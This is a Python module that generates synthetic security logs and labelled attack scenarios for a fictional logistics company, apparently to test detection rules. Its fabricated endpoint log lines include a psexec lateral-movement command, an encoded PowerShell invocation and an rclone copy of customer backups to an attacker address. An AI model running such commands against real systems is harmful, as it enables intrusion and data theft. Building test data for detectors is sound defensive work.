"""Synthetic log source for the Northwind Logistics network.

Used by both scripts/generate_data.py (historical backfill) and scripts/live_feed.py (stream).
Every attack generator returns the events it produced plus ground-truth metadata so detections
can be validated afterwards.
"""
from __future__ import annotations

import random
import zlib
from dataclasses import dataclass
from datetime import datetime, timedelta
from typing import Any

from faker import Faker

from backend.mitre import MITRE

DEPARTMENTS = ["Operations", "Fleet Management", "Finance", "Customer Service", "IT", "HR",
               "Sales", "Procurement", "Warehouse", "Legal"]
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 465, 587, 993, 995,
                1433, 1521, 3000, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 9200, 27017]
PORT_PROTO = {443: "https", 80: "http", 8080: "http", 5432: "sql", 3306: "sql", 53: "dns", 123: "ntp",
              22: "ssh", 3389: "rdp", 445: "smb", 5985: "winrm"}
ADMIN_PROTOCOLS = ["ssh", "rdp", "smb", "winrm"]
PATHS = ["/login", "/api/shipments", "/api/tracking/", "/api/invoices", "/portal/dashboard", "/static/app.js",
         "/api/drivers", "/health", "/api/routes/optimise", "/account/profile"]
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)",
               "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)", "NorthwindFleetApp/4.2 (Android 14)", "curl/8.4.0"]
SOURCES = {"auth_fail": "auth-service", "auth_success": "auth-service", "fw_deny": "perimeter-firewall",
           "fw_allow": "perimeter-firewall", "http_request": "web-gateway"}


@dataclass
class Network:
    """The fictional enterprise: hosts, users, external address pool, threat-intel list."""

    hosts: list[dict[str, Any]]
    users: list[dict[str, Any]]
    external_ips: list[str]
    bad_ips: list[str]
    by_subnet: dict[str, list[dict[str, Any]]]
    by_ip: dict[str, dict[str, Any]]
    ws_of_user: dict[str, dict[str, Any]]


def _fmt_ts(base: datetime, offset_ms: float) -> datetime:
    """Return base + offset truncated to milliseconds (Mongo date precision)."""
    return base + timedelta(milliseconds=int(offset_ms))


def build_network(rng: random.Random) -> Network:
    """Create ~120 hosts, 80 employees, and the external IP pool."""
    fake = Faker("en_GB")
    Faker.seed(rng.randint(0, 10**6))
    users: list[dict[str, Any]] = []
    seen: set[str] = set()
    while len(users) < 80:
        first, last = fake.first_name(), fake.last_name()
        uname = (first[0] + last).lower().replace("'", "").replace(" ", "")
        if uname in seen:
            continue
        seen.add(uname)
        users.append({"username": uname, "fullName": f"{first} {last}", "department": rng.choice(DEPARTMENTS),
                      "role": "employee", "remote": len(users) >= 70})

    plan = [("web", 14, "10.10.1.", "web-gateway", "Ubuntu 22.04", "high"),
            ("app", 16, "10.10.2.", "application-server", "Ubuntu 22.04", "high"),
            ("db", 8, "10.10.3.", "database-server", "RHEL 9", "critical"),
            ("workstation", 70, "10.20.1.", "employee-workstation", "Windows 11", "medium"),
            ("vpn", 12, "10.30.1.", "vpn-gateway", "FortiOS 7", "high")]
    hosts: list[dict[str, Any]] = []
    prefix = {"web": "web", "app": "app", "db": "db", "workstation": "ws", "vpn": "vpn"}
    for subnet, n, ip_prefix, role, os_name, crit in plan:
        for i in range(1, n + 1):
            hosts.append({"hostname": f"nwl-{prefix[subnet]}-{i:02d}", "ip": f"{ip_prefix}{10 + i}", "subnet": subnet,
                          "role": role, "os": os_name, "owner": None, "criticality": crit})
    by_subnet: dict[str, list[dict[str, Any]]] = {}
    for h in hosts:
        by_subnet.setdefault(h["subnet"], []).append(h)
    ws_of_user: dict[str, dict[str, Any]] = {}
    for u, ws in zip([u for u in users if not u["remote"]], by_subnet["workstation"]):
        ws["owner"] = u["username"]
        ws_of_user[u["username"]] = ws

    def public_ip() -> str:
        while True:
            a = rng.choice([5, 23, 31, 45, 62, 77, 85, 91, 103, 109, 141, 154, 176, 185, 193, 195, 203, 212])
            ip = f"{a}.{rng.randint(1, 254)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
            if ip not in used:
                used.add(ip)
                return ip

    used: set[str] = set()
    external = [public_ip() for _ in range(400)]
    bad = [public_ip() for _ in range(40)]
    return Network(hosts, users, external, bad, by_subnet, {h["ip"]: h for h in hosts}, ws_of_user)


def make_event(ts: datetime, etype: str, src: str, host: dict | str, dst_ip: str | None = None,
               dst_port: int | None = None, user: str | None = None, nbytes: int | None = None,
               status: int | None = None, severity: str = "info") -> dict[str, Any]:
    """Build one structured event document (absent fields are omitted)."""
    hostname = host if isinstance(host, str) else host["hostname"]
    ev: dict[str, Any] = {"ts": ts, "meta": {"source": SOURCES[etype], "host": hostname}, "eventType": etype,
                          "srcIp": src, "host": hostname, "severity": severity}
    if dst_ip is not None:
        ev["dstIp"] = dst_ip
    if dst_port is not None:
        ev["dstPort"] = dst_port
    if user is not None:
        ev["user"] = user
    if nbytes is not None:
        ev["bytesOut"] = nbytes
    if status is not None:
        ev["statusCode"] = status
    return ev


def raw_message(rng: random.Random, ev: dict[str, Any]) -> str:
    """Render a syslog-style text line for an event (stored in raw_logs for full-text search)."""
    t, host, src = ev["eventType"], ev["host"], ev["srcIp"]
    sport = rng.randint(1024, 65535)
    if t == "auth_fail":
        return f"{host} auth-service[{rng.randint(100, 9999)}]: Failed password for {ev['user']} from {src} port {sport} ssh2"
    if t == "auth_success":
        return f"{host} auth-service[{rng.randint(100, 9999)}]: Accepted password for {ev['user']} from {src} port {sport} ssh2"
    if t == "fw_deny":
        return f"{host} perimeter-firewall: DENY proto=TCP src={src}:{sport} dst={ev.get('dstIp')}:{ev.get('dstPort')} rule=default-deny"
    if t == "fw_allow":
        return (f"{host} perimeter-firewall: ALLOW proto=TCP src={src}:{sport} dst={ev.get('dstIp')}:{ev.get('dstPort')} "
                f"bytes={ev.get('bytesOut', 0)}")
    return (f'{host} nginx: {src} - - "GET {rng.choice(PATHS)} HTTP/1.1" {ev.get("statusCode")} '
            f'{ev.get("bytesOut", 0)} "{rng.choice(USER_AGENTS)}"')


# ----------------------------------------------------------------------------- normal traffic

def _lognormal_bytes(rng: random.Random, median: int, sigma: float = 1.0) -> int:
    return max(40, int(rng.lognormvariate(0, sigma) * median))


class NormalTraffic:
    """Generates routine events: business-hours auth, steady http, routine firewall allows/denies."""

    def __init__(self, net: Network, rng: random.Random) -> None:
        self.net, self.rng = net, rng
        self.dns_hosts = net.by_subnet["app"][:2]
        # a handful of workstations talk to cloud apps with larger uploads (legitimate)
        self.heavy_ws = rng.sample(net.by_subnet["workstation"], 3)

    @staticmethod
    def is_business_hour(ts: datetime) -> bool:
        """Mon-Fri 08:00-18:00."""
        return ts.weekday() < 5 and 8 <= ts.hour < 18

    def event(self, ts: datetime) -> tuple[dict[str, Any], dict[str, Any] | None]:
        """Return (event, optional connection edge) at timestamp ts."""
        rng, net = self.rng, self.net
        biz = self.is_business_hour(ts)
        weights = [40, 32, 9, 0.5, 18.5] if biz else [38, 40, 1, 0.2, 20.8]
        etype = rng.choices(["http_request", "fw_allow", "auth_success", "auth_fail", "fw_deny"], weights)[0]

        if etype == "http_request":
            web = rng.choice(net.by_subnet["web"])
            if rng.random() < 0.7:
                src = rng.choice(net.external_ips)
            else:
                src = rng.choice(net.by_subnet["workstation"])["ip"]
            status = rng.choices([200, 304, 301, 404, 403, 500], [78, 9, 4, 5, 2, 2])[0]
            sev = "low" if status >= 500 else "info"
            return make_event(ts, etype, src, web, web["ip"], 443 if rng.random() < 0.92 else 80, None,
                              _lognormal_bytes(rng, 900, 0.8), status, sev), None

        if etype == "fw_allow":
            r = rng.random()
            conn = None
            if r < 0.40:  # workstation -> web/app (internal apps)
                src_h = rng.choice(net.by_subnet["workstation"])
                dst_h = rng.choice(net.by_subnet["web"] + net.by_subnet["app"])
                port, dst_ip, nbytes = rng.choice([443, 8080]), dst_h["ip"], _lognormal_bytes(rng, 18_000)
            elif r < 0.55:  # web -> app
                src_h, dst_h = rng.choice(net.by_subnet["web"]), rng.choice(net.by_subnet["app"])
                port, dst_ip, nbytes = 8080, dst_h["ip"], _lognormal_bytes(rng, 12_000)
            elif r < 0.75:  # app -> db
                src_h, dst_h = rng.choice(net.by_subnet["app"]), rng.choice(net.by_subnet["db"])
                port, dst_ip, nbytes = rng.choice([5432, 3306]), dst_h["ip"], _lognormal_bytes(rng, 30_000)
            elif r < 0.92:  # workstation -> internet (browsing / SaaS)
                src_h = rng.choice(net.by_subnet["workstation"])
                dst_h, dst_ip, port = None, rng.choice(net.external_ips), 443
                nbytes = _lognormal_bytes(rng, 60_000, 1.2)
                if src_h in self.heavy_ws and rng.random() < 0.05:
                    nbytes = rng.randint(2_000_000, 6_000_000)  # legitimate file sync
            else:  # servers -> dns / ntp
                src_h = rng.choice(net.by_subnet["web"] + net.by_subnet["app"] + net.by_subnet["db"])
                dst_h = rng.choice(self.dns_hosts)
                port, dst_ip, nbytes = rng.choice([53, 123]), dst_h["ip"], _lognormal_bytes(rng, 300, 0.5)
            if dst_h is not None and rng.random() < 0.3:
                conn = {"srcHost": src_h["hostname"], "dstHost": dst_h["hostname"], "ts": ts,
                        "protocol": PORT_PROTO.get(port, "tcp")}
            return make_event(ts, etype, src_h["ip"], src_h, dst_ip, port, None, nbytes), conn

        if etype == "fw_deny":
            tgt = rng.choice(net.by_subnet["web"] + net.by_subnet["vpn"])
            return make_event(ts, etype, rng.choice(net.external_ips), tgt, tgt["ip"], rng.choice(COMMON_PORTS),
                              None, None, None, "low"), None

        user = rng.choice(net.users)
        if user["remote"] or rng.random() < 0.08:
            src_ip = net.external_ips[zlib.crc32(user["username"].encode()) % len(net.external_ips)]
            host = rng.choice(net.by_subnet["vpn"])
        else:
            ws = net.ws_of_user.get(user["username"]) or rng.choice(net.by_subnet["workstation"])
            src_ip = ws["ip"]
            host = rng.choice(net.by_subnet["app"] + net.by_subnet["web"])
        sev = "low" if etype == "auth_fail" else "info"
        return make_event(ts, etype, src_ip, host, host["ip"], 443, user["username"], None, None, sev), None


# ----------------------------------------------------------------------------- attack scenarios

def _scenario(kind: str, **fields: Any) -> dict[str, Any]:
    return {"type": kind, "mitre": MITRE[kind], "malicious": True, **fields}


def attack_brute_force(rng: random.Random, net: Network, start: datetime, attacker: str,
                       failures: int = 600, spread_ms: int = 600_000) -> tuple[list[dict], dict]:
    """One IP, hundreds of auth_fail against one user, then one auth_success."""
    user = rng.choice(net.users)["username"]
    host = rng.choice(net.by_subnet["vpn"])
    offs = sorted(rng.uniform(0, spread_ms) for _ in range(failures))
    evs = [make_event(_fmt_ts(start, o), "auth_fail", attacker, host, host["ip"], 443, user, None, None, "medium")
           for o in offs]
    evs.append(make_event(_fmt_ts(start, spread_ms + 3000), "auth_success", attacker, host, host["ip"], 443,
                          user, None, None, "high"))
    sc = _scenario("brute_force", srcIp=attacker, detectKey=attacker, targetUser=user, targetHost=host["hostname"],
                   startTs=start, endTs=_fmt_ts(start, spread_ms + 3000), failedCount=failures, succeeded=True)
    return evs, sc


def attack_low_and_slow_brute_force(rng: random.Random, net: Network, start: datetime, attacker: str,
                                    duration_hours: int = 4, fails_per_5m: int = 8) -> tuple[list[dict], dict]:
    """Low-and-slow brute force: ~8 failures per 5 minutes over several hours to evade velocity detectors."""
    user = rng.choice(net.users)["username"]
    host = rng.choice(net.by_subnet["vpn"])
    total_5m_blocks = duration_hours * 12
    evs: list[dict] = []
    current_ms = 0.0
    for block in range(total_5m_blocks):
        block_offs = sorted(rng.uniform(block * 300_000, (block + 1) * 300_000) for _ in range(fails_per_5m))
        for o in block_offs:
            evs.append(make_event(_fmt_ts(start, o), "auth_fail", attacker, host, host["ip"], 443,
                                  user, None, None, "medium"))
            current_ms = max(current_ms, o)
    evs.append(make_event(_fmt_ts(start, current_ms + 10_000), "auth_success", attacker, host, host["ip"], 443,
                          user, None, None, "high"))
    sc = _scenario("brute_force", srcIp=attacker, detectKey=attacker, targetUser=user, targetHost=host["hostname"],
                   startTs=start, endTs=_fmt_ts(start, current_ms + 10_000), failedCount=len(evs) - 1, succeeded=True,
                   subtype="low_and_slow", failsPer5m=fails_per_5m)
    return evs, sc


def attack_password_spray(rng: random.Random, net: Network, start: datetime, attacker: str,
                          users_n: int = 45, attempts: int = 3) -> tuple[list[dict], dict]:
    """One IP, a few attempts across many users."""
    host = rng.choice(net.by_subnet["vpn"])
    targets = rng.sample(net.users, users_n)
    evs: list[dict] = []
    offset = 0.0
    for round_i in range(attempts):
        for u in targets:
            offset += rng.uniform(5_000, 30_000)
            evs.append(make_event(_fmt_ts(start, offset), "auth_fail", attacker, host, host["ip"], 443,
                                  u["username"], None, None, "medium"))
    sc = _scenario("password_spraying", srcIp=attacker, detectKey=attacker, targetHost=host["hostname"],
                   userCount=users_n, attemptsPerUser=attempts, startTs=start, endTs=_fmt_ts(start, offset))
    return evs, sc


def attack_port_scan(rng: random.Random, net: Network, start: datetime, attacker: str,
                     ports: int = 500, spread_ms: int = 90_000) -> tuple[list[dict], dict]:
    """One IP hitting hundreds of ports on one host (many fw_deny)."""
    host = rng.choice(net.by_subnet["web"] + net.by_subnet["app"])
    port_list = rng.sample(range(1, 10_000), ports)
    offs = sorted(rng.uniform(0, spread_ms) for _ in range(ports))
    evs = [make_event(_fmt_ts(start, o), "fw_deny", attacker, host, host["ip"], p, None, None, None, "medium")
           for o, p in zip(offs, port_list)]
    sc = _scenario("port_scan", srcIp=attacker, detectKey=attacker, targetHost=host["hostname"], portCount=ports,
                   startTs=start, endTs=_fmt_ts(start, spread_ms))
    return evs, sc


def attack_lateral(rng: random.Random, net: Network, start: datetime,
                   db_host: dict | None = None) -> tuple[list[dict], list[dict], list[dict], dict]:
    """Compromised workstation -> app server -> db server. Returns (events, connections, raw extras, scenario)."""
    ws = rng.choice(net.by_subnet["workstation"])
    app = rng.choice(net.by_subnet["app"])
    db = db_host or rng.choice(net.by_subnet["db"])
    hop1_proto, hop2_proto = rng.choice(["rdp", "ssh"]), rng.choice(["smb", "ssh", "winrm"])
    t1, t2 = _fmt_ts(start, 0), _fmt_ts(start, rng.randint(240_000, 600_000))
    port = {"ssh": 22, "rdp": 3389, "smb": 445, "winrm": 5985}
    owner = ws.get("owner") or "svc-backup"
    evs = [make_event(t1, "auth_success", ws["ip"], app, app["ip"], port[hop1_proto], owner, None, None, "high"),
           make_event(t2, "auth_success", app["ip"], db, db["ip"], port[hop2_proto], "svc-deploy", None, None, "high")]
    conns = [{"srcHost": ws["hostname"], "dstHost": app["hostname"], "ts": t1, "protocol": hop1_proto},
             {"srcHost": app["hostname"], "dstHost": db["hostname"], "ts": t2, "protocol": hop2_proto}]
    extras = [{"ts": t1, "host": app["hostname"], "srcIp": ws["ip"], "eventType": "process", "source": "endpoint-agent",
               "message": f"{app['hostname']} endpoint-agent: process created cmd.exe /c psexec \\\\{app['hostname']} -u {owner} from {ws['hostname']}"},
              {"ts": t2, "host": db["hostname"], "srcIp": app["ip"], "eventType": "process", "source": "endpoint-agent",
               "message": f"{db['hostname']} endpoint-agent: process created powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBl lateral hop from {app['hostname']}"}]
    sc = _scenario("lateral_movement", srcIp=ws["ip"], detectKey=ws["hostname"], originHost=ws["hostname"],
                   chain=[ws["hostname"], app["hostname"], db["hostname"]], hopSrcIps=[app["ip"]],
                   protocols=[hop1_proto, hop2_proto], startTs=t1, endTs=t2)
    return evs, conns, extras, sc


def attack_exfil(rng: random.Random, net: Network, start: datetime, attacker_ip: str,
                 db_host: dict | None = None, chunks: int = 40) -> tuple[list[dict], list[dict], dict]:
    """Abnormal bytesOut spike from a database server to an external IP."""
    db = db_host or rng.choice(net.by_subnet["db"])
    offset, evs, total = 0.0, [], 0
    for _ in range(chunks):
        offset += rng.uniform(20_000, 45_000)
        nb = rng.randint(60_000_000, 140_000_000)
        total += nb
        evs.append(make_event(_fmt_ts(start, offset), "fw_allow", db["ip"], db, attacker_ip, 443, None, nb, None, "high"))
    extras = [{"ts": start, "host": db["hostname"], "srcIp": db["ip"], "eventType": "process", "source": "endpoint-agent",
               "message": f"{db['hostname']} endpoint-agent: process created rclone copy /var/backups/customers remote:{attacker_ip} --transfers 8"}]
    sc = _scenario("exfiltration", srcIp=db["ip"], detectKey=db["ip"], sourceHost=db["hostname"], destination=attacker_ip,
                   totalBytes=total, startTs=start, endTs=_fmt_ts(start, offset))
    return evs, extras, sc
